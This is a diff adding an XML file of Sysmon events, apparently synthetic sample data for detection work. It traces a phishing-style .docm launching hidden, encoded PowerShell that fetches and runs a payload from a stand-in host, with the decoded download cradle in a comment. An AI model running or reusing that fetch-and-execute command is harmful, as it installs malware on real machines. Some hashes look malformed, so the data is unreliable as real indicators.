@@ -1,0 +1,159 @@
+<Events>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2024-01-15T09:17:42.318Z"/>
+      <EventRecordID>98201</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="2844" ThreadID="3160"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>FINANCE-WS04.corp.acme.local</Computer>
+      <Security UserID="S-1-5-21-3541430928-2051711210-1391384369-1147"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
+      <Data Name="UtcTime">2024-01-15 09:17:42.301</Data>
+      <Data Name="ProcessGuid">{C4D396A1-82FA-65A5-3B07-000000001E00}</Data>
+      <Data Name="ProcessId">5184</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Windows PowerShell</Data>
+      <Data Name="Product">Microsoft Windows Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">PowerShell.EXE</Data>
+      <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAtAGMAMgAuAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA</Data>
+      <Data Name="CurrentDirectory">C:\Users\mthompson\Documents\</Data>
+      <Data Name="User">ACME\mthompson</Data>
+      <Data Name="LogonGuid">{C4D396A1-1E5A-65A5-C1F3-0A0000000000}</Data>
+      <Data Name="LogonId">0xAF3C1</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,MD5=04029E121A0CFA5991749937DD22A1D9,IMPHASH=F2C0E8A5BD10DBC167E85C065E0B4BEF</Data>
+      <Data Name="ParentProcessGuid">{C4D396A1-82E1-65A5-3A07-000000001E00}</Data>
+      <Data Name="ParentProcessId">4528</Data>
+      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\mthompson\Documents\Q4_Financial_Review_URGENT.docm"</Data>
+      <Data Name="ParentUser">ACME\mthompson</Data>
+    </EventData>
+  </Event>
+
+  <!-- Decoded EncodedCommand: IEX (New-Object Net.WebClient).DownloadString('hxxp://malware-c2[.]evil.com/payload.exe') -->
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>3</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>3</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2024-01-15T09:17:43.682Z"/>
+      <EventRecordID>98202</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="2844" ThreadID="3160"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>FINANCE-WS04.corp.acme.local</Computer>
+      <Security UserID="S-1-5-21-3541430928-2051711210-1391384369-1147"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1071.001,technique_name=Web Protocols</Data>
+      <Data Name="UtcTime">2024-01-15 09:17:43.671</Data>
+      <Data Name="ProcessGuid">{C4D396A1-82FA-65A5-3B07-000000001E00}</Data>
+      <Data Name="ProcessId">5184</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="User">ACME\mthompson</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="SourceIsIpv6">false</Data>
+      <Data Name="SourceIp">10.0.2.47</Data>
+      <Data Name="SourceHostname">FINANCE-WS04.corp.acme.local</Data>
+      <Data Name="SourcePort">52841</Data>
+      <Data Name="SourcePortName"/>
+      <Data Name="DestinationIsIpv6">false</Data>
+      <Data Name="DestinationIp">198.51.100.73</Data>
+      <Data Name="DestinationHostname">malware-c2.evil.com</Data>
+      <Data Name="DestinationPort">80</Data>
+      <Data Name="DestinationPortName">http</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>11</EventID>
+      <Version>2</Version>
+      <Level>4</Level>
+      <Task>11</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2024-01-15T09:17:45.102Z"/>
+      <EventRecordID>98203</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="2844" ThreadID="3160"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>FINANCE-WS04.corp.acme.local</Computer>
+      <Security UserID="S-1-5-21-3541430928-2051711210-1391384369-1147"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1105,technique_name=Ingress Tool Transfer</Data>
+      <Data Name="UtcTime">2024-01-15 09:17:45.094</Data>
+      <Data Name="ProcessGuid">{C4D396A1-82FA-65A5-3B07-000000001E00}</Data>
+      <Data Name="ProcessId">5184</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TargetFilename">C:\Users\mthompson\AppData\Local\Temp\payload.exe</Data>
+      <Data Name="CreationUtcTime">2024-01-15 09:17:45.094</Data>
+      <Data Name="User">ACME\mthompson</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2024-01-15T09:17:46.540Z"/>
+      <EventRecordID>98204</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="2844" ThreadID="3160"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>FINANCE-WS04.corp.acme.local</Computer>
+      <Security UserID="S-1-5-21-3541430928-2051711210-1391384369-1147"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1204.002,technique_name=Malicious File</Data>
+      <Data Name="UtcTime">2024-01-15 09:17:46.531</Data>
+      <Data Name="ProcessGuid">{C4D396A1-8302-65A5-3C07-000000001E00}</Data>
+      <Data Name="ProcessId">6920</Data>
+      <Data Name="Image">C:\Users\mthompson\AppData\Local\Temp\payload.exe</Data>
+      <Data Name="FileVersion">1.0.0.0</Data>
+      <Data Name="Description"/>
+      <Data Name="Product"/>
+      <Data Name="Company"/>
+      <Data Name="OriginalFileName">svchost_update.exe</Data>
+      <Data Name="CommandLine">"C:\Users\mthompson\AppData\Local\Temp\payload.exe"</Data>
+      <Data Name="CurrentDirectory">C:\Users\mthompson\AppData\Local\Temp\</Data>
+      <Data Name="User">ACME\mthompson</Data>
+      <Data Name="LogonGuid">{C4D396A1-1E5A-65A5-C1F3-0A0000000000}</Data>
+      <Data Name="LogonId">0xAF3C1</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA256=7B3F5C2A8E9D1F4A6B2C8E0D3F5A7B9C1D4E6F8A0B2C4D6E8F0A1B3C5D7E9F,MD5=4A8B2C6D0E2F4A6B8C0D2E4F6A8B0C2D,IMPHASH=B18CC5C6E8E7A408B83AE898C89C0053</Data>
+      <Data Name="ParentProcessGuid">{C4D396A1-82FA-65A5-3B07-000000001E00}</Data>
+      <Data Name="ParentProcessId">5184</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAtAGMAMgAuAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA</Data>
+      <Data Name="ParentUser">ACME\mthompson</Data>
+    </EventData>
+  </Event>
+</Events>
